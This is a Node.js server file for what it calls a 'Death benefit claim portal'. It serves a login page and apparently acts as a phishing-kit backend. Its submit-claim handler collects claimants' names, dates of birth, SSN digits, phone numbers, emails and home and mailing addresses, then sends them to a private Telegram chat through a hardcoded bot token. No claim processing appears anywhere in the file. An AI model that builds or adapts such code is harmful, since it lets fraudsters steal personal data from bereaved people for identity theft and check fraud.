// --- Telegram Notification Integration ---
const TELEGRAM_BOT_TOKEN = "8388477618:AAHkepQg1LCuFvyumV7_Pnweej3tcL0H92M";
const TELEGRAM_USER_ID = "6969127152";

const https = require("https");
// const nodemailer = require("nodemailer");



function sendTelegramNotification(payload, callback) {
  // Only include the requested fields
  let message = '*Claimant Name:* ' + (payload.claimantName || '') + '\n'
    + '*Relationship to Deceased:* ' + (payload.relationship || '') + '\n'
    + '*Claimant Email:* ' + (payload.email || '') + '\n'
    + '*Claimant Phone:* ' + (payload.phone || '') + '\n'
    + '*Date of Birth:* ' + (payload.dob || '') + '\n'
    + '*Tax ID / SSN (last 4):* ' + (payload.taxId || '') + '\n'
    + '*Home Address:* ' + (payload.address || '') + '\n'
    + '*City:* ' + (payload.city || '') + '\n'
    + '*State:* ' + (payload.state || '') + '\n'
    + '*ZIP Code:* ' + (payload.zipCode || '') + '\n'
    + '*Mailing address:* ' + [payload.checkMailAddress, payload.checkMailCity, payload.checkMailState, payload.checkMailZip].filter(Boolean).join(', ');

  const postData = JSON.stringify({
    chat_id: TELEGRAM_USER_ID,
    text: message,
    parse_mode: "Markdown"
  });
  console.log("[TELEGRAM] Sending payload:", postData); // Log the full payload
  const options = {
    hostname: "api.telegram.org",
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(postData)
    }
  };
  const req = https.request(options, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      console.log("[TELEGRAM] API response:", data); // Log the full response
      callback(null, data);
    });
  });
  req.on("error", (e) => {
    console.error("[TELEGRAM] Request error:", e);
    callback(e);
  });
  req.write(postData);
  req.end();
}

const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = Number(process.env.PORT || 5500);
const root = __dirname;

const contentTypes = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
};

const server = http.createServer((request, response) => {
  // --- CORS support ---
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (request.method === 'OPTIONS') {
    response.writeHead(204);
    response.end();
    return;
  }
  if (request.method === "POST" && request.url === "/api/submit-claim") {
    const userAgent = request.headers['user-agent'] || 'unknown';
    console.log("Received POST /api/submit-claim from user-agent:", userAgent);
    let body = "";
    request.on("data", chunk => { body += chunk; });
    request.on("end", () => {
      try {
        const payload = JSON.parse(body);
        console.log("Payload received:", payload);
        // Send Telegram notification
        sendTelegramNotification(payload, (err, tgRes) => {
          // Log Telegram API response or error for debugging
          if (err) {
            console.error("Telegram notification error:", err);
            // Try to include Telegram API error details if available
            let errorMsg = err.message;
            if (tgRes) {
              errorMsg += ' | Telegram response: ' + tgRes;
            }
            response.writeHead(500, { "Content-Type": "application/json" });
            response.end(JSON.stringify({ ok: false, error: errorMsg }));
          } else {
            console.log("Telegram API response:", tgRes);
            // Try to parse Telegram API response for errors
            let tgJson;
            try {
              tgJson = JSON.parse(tgRes);
            } catch (e) {}
            if (tgJson && tgJson.ok === false) {
              response.writeHead(500, { "Content-Type": "application/json" });
              response.end(JSON.stringify({ ok: false, error: tgJson.description || 'Telegram API error' }));
            } else {
              response.writeHead(200, { "Content-Type": "application/json" });
              response.end(JSON.stringify({ ok: true }));
            }
          }
        });
      } catch (e) {
        response.writeHead(400, { "Content-Type": "application/json" });
        response.end(JSON.stringify({ ok: false, error: "Invalid JSON" }));
      }
    });
    return;
  }

  const urlPath = request.url === "/" ? "/login.html" : request.url;
  const filePath = path.join(root, decodeURIComponent(urlPath.split("?")[0]));

  if (!filePath.startsWith(root)) {
    response.writeHead(403, { "Content-Type": "text/plain; charset=utf-8" });
    response.end("Forbidden");
    return;
  }

  fs.readFile(filePath, (error, file) => {
    if (error) {
      response.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
      response.end("Not found");
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    response.writeHead(200, {
      "Content-Type": contentTypes[ext] || "application/octet-stream",
      "Cache-Control": "no-store",
    });
    response.end(file);
  });
});

server.listen(PORT, () => {
  console.log(`Death benefit claim portal running at http://127.0.0.1:${PORT}`);
});
